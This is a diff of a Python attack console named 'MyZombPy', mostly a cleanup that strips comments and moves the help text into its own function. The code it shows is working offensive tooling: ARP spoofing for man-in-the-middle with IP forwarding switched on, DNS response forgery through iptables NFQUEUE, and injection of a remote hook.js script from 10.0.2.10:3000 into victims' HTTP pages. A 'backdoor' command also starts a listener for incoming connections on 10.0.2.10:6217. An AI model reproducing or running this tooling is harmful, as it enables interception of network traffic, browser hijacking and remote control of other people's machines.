@@ -14,7 +14,26 @@ import VulnerabilityScanner
 from Listener import Listener
 
 
-# function that returns target, source IPs from input
+def help_message():
+    print("--------------------------------------------------")
+    print("COMMANDS      DESCRIPTION")
+    print("--------------------------------------------------")
+    print("help          Show commands")
+    print("scan          Network scanning")
+    print("arpspoof      Manual or Auto Arp Spoof")
+    print("dnsspoof      DNS Spoof Attack")
+    print("hook          Hook Injector")
+    print("killarp       Kill process running Arp Spoof")
+    print("killdns       Kill process running Dns Spoof")
+    print("killhook      Kill process running Hook Injector")
+    print("vulnscan      Vulnerability Scanner")
+    print("backdoor      Control Center")
+    print("portscan      Scan for open ports")
+    print("requestdns    Scan for open ports on a DNS server")
+    print("exit          Exit the app")
+    print("--------------------------------------------------")
+
+
 def ip_input(scan_list):
     trgt, src = '', ''
     print("IP Table")
@@ -28,7 +47,6 @@ def ip_input(scan_list):
     return [trgt], src
 
 
-# function that returns MAC address of selected IP
 def get_mac(ip):
     answered_mac = NetworkScanner.broadcast(ip)
     try:
@@ -37,24 +55,19 @@ def get_mac(ip):
         pass
 
 
-# function that spoofs IPs
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-
-    # Target sees attacker's MAC address but thinks it's the router cause of the IP
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 
-# function that restores the communication of two devices
 def restore(dst_ip, src_ip):
     dst_mac = get_mac(dst_ip)
     src_mac = get_mac(src_ip)
     packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
-    scapy.send(packet, count=4, verbose=False)  # count: number of times to send
+    scapy.send(packet, count=4, verbose=False)
 
 
-# function that resets ARP tables and restores original connections
 def cleanup(targets, src):
     for target_ip in targets:
         if target_ip != router_ip:
@@ -65,55 +78,53 @@ def cleanup(targets, src):
     allow_arp = 1
 
 
-# function that creates a Man in the Middle
 def arp_spoof(targets, src):
     if SYS_PLATFORM == 'linux':
         try:
             with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                f.write("1")  # enable ip forwarding to allow flow of packets through machine
+                f.write("1")
             while True:
                 for target_ip in targets:
                     if target_ip != router_ip:
                         spoof(target_ip, src)
                         spoof(src, target_ip)
                 time.sleep(2)
-        except Exception:
+        except:
             print("[!] Something went wrong ... Resetting ARP Tables...")
             cleanup(targets, src)
             with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                f.write("0")  # disable ip forwarding
+                f.write("0")
 
 
-# function that modifies DNS layer packets
 def process_packet_dns(packet, target_website, modified_ip):
-    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
-    if scapy_packet.haslayer(scapy.DNSRR):  # check if packet has a dns response layer
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
         if target_website in qname:
-            # create a dns response, keep the name, change the ip to the preferred one
             answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
-            scapy_packet[scapy.DNS].an = answer  # modify the answer of the packet
-            scapy_packet[scapy.DNS].ancount = 1  # modify the number of answers of the packet
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
 
-            # remove variables that would corrupt the modified packet, scapy will auto redefine them
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.UDP].len
+            try:
+                del scapy_packet[scapy.UDP].chksum
+                del scapy_packet[scapy.UDP].len
+            except IndexError:
+                pass
 
-            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
-    packet.accept()  # allow forwarding the packet to it's destination
+            packet.set_payload(bytes(scapy_packet))
+    packet.accept()
 
 
-# function that modifies HTTP layer packets
 def process_packet_hook(packet):
-    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
-    if scapy_packet.haslayer(scapy.Raw):  # check if packet has a Raw layer
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load.decode("utf-8", "ignore")
         load = load.replace("HTTP/1.1", "HTTP/1.0")
-        if scapy_packet[scapy.TCP].dport == 80:  # it's a HTTP Request, dport: destination port, port for http
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # remove the encoding
-        elif scapy_packet[scapy.TCP].sport == 80:  # it's a HTTP Response, sport: source port, port for http
+        if scapy_packet[scapy.TCP].dport == 80:
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+        elif scapy_packet[scapy.TCP].sport == 80:
             injection_code = '<script src="http://10.0.2.10:3000/hook.js"></script>'
             load = load.replace("</body>", "</body>" + injection_code)
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
@@ -127,21 +138,20 @@ def process_packet_hook(packet):
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.TCP].chksum
-            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
-    packet.accept()  # allow forwarding the packet to it's destination
+            packet.set_payload(bytes(scapy_packet))
+    packet.accept()
 
 
-# function that spoofs a DNS response
 def dns_spoof(target_website, modified_ip):
     subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
-    queue = netfilterqueue.NetfilterQueue()  # object creation
+    queue = netfilterqueue.NetfilterQueue()
     queue.bind(1,
                lambda packet, target_website=target_website, modified_ip=modified_ip:
                process_packet_dns(packet, target_website, modified_ip)
-               )  # connect to an existed queue
+               )
     try:
         queue.run()
-    except Exception:
+    except:
         print("[!] Something went wrong ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
         print("[+] Done.")
@@ -149,14 +159,13 @@ def dns_spoof(target_website, modified_ip):
         allow_dns = 1
 
 
-# function that injects a hook
 def hook():
     subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
-    queue = netfilterqueue.NetfilterQueue()  # object creation
-    queue.bind(1, process_packet_hook)  # connect to an existed queue
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(1, process_packet_hook)
     try:
         queue.run()
-    except Exception:
+    except:
         print("[!] Something went wrong ... FlUSHING IPTABLES...")
         subprocess.run(["iptables", "--flush"])
         print("[+] Done.")
@@ -204,7 +213,7 @@ def kill_arp():
             cleanup(selected, source)
             if SYS_PLATFORM == 'linux':
                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                    f.write("0")  # disable ip forwarding
+                    f.write("0")
         else:
             print('[-] No arp spoof running at the moment.')
     except NameError:
@@ -243,21 +252,30 @@ def scan_dns(dns_port):
         pass
 
 
-SYS_PLATFORM = sys.platform  # os of the current machine
-command = ''  # command to be executed
-allow_arp = 1  # flag that shows if an arp spoof is already running
-allow_dns = 1  # flag that shows if a dns spoof is already running
-allow_hook = 1  # flag that shows if a hook injector is already running
-scan_result = []  # list of network IPs
-tcp_ports = []  # list of open ports
-router_ip = scapy.conf.route.route("0.0.0.0")[2]  # router's ip
+SYS_PLATFORM = sys.platform
+command = ''
+allow_arp = 1
+allow_dns = 1
+allow_hook = 1
+scan_result = []
+tcp_ports = []
+router_ip = scapy.conf.route.route("0.0.0.0")[2]
 
-print('Welcome back Boss!')
+
+print("  __  __       ______               _     _____       \n"
+      " |  \/  |     |___  /              | |   |  __ \      \n"
+      " | \  / |_   _   / / ___  _ __ ___ | |__ | |__) |   _ \n"
+      " | |\/| | | | | / / / _ \| '_ ` _ \| '_ \|  ___/ | | |\n"
+      " | |  | | |_| |/ /_| (_) | | | | | | |_) | |   | |_| |\n"
+      " |_|  |_|\__, /_____\___/|_| |_| |_|_.__/|_|    \__, |\n"
+      "          __/ |                                  __/ |\n"
+      "         |___/                                  |___/ \n")
+print("Type help to show commands\n")
+print("Welcome back Boss!")
 
 while True:
     print("Insert your command:")
     command = input(">> ")
-    # try:
     if command == "exit":
         kill_arp()
         print("[+] Cya later Boss!")
@@ -331,7 +349,7 @@ while True:
         print("\n[+] Process finished...")
 
     elif command == 'backdoor':
-        my_listener = Listener("10.0.2.10", 6217)  # listener for incoming connections
+        my_listener = Listener("10.0.2.10", 6217)
         service = multiprocessing.Process(target=my_listener.server)
         connections_status = multiprocessing.Process(target=my_listener.check_connections)
         service.start()
@@ -381,26 +399,7 @@ while True:
         kill_hook()
 
     elif command == "help":
-        print("--------------------------------------------------")
-        print("COMMANDS      DESCRIPTION")
-        print("--------------------------------------------------")
-        print("help          Show commands")
-        print("scan          Network scanning")
-        print("arpspoof      Manual or Auto Arp Spoof")
-        print("dnsspoof      DNS Spoof Attack")
-        print("hook          Hook Injector")
-        print("killarp       Kill process running Arp Spoof")
-        print("killdns       Kill process running Dns Spoof")
-        print("killhook      Kill process running Hook Injector")
-        print("vulnscan      Vulnerability Scanner")
-        print("backdoor      Control Center")
-        print("portscan      Scan for open ports")
-        print("requestdns    Scan for open ports on a DNS server")
-        print("exit          Exit the app")
-        print("--------------------------------------------------")
+        help_message()
 
     else:
         print('[-] Command not found. Type help to show commands.')
-
-    # except Exception:
-    #     print('[-] Error during command execution.')
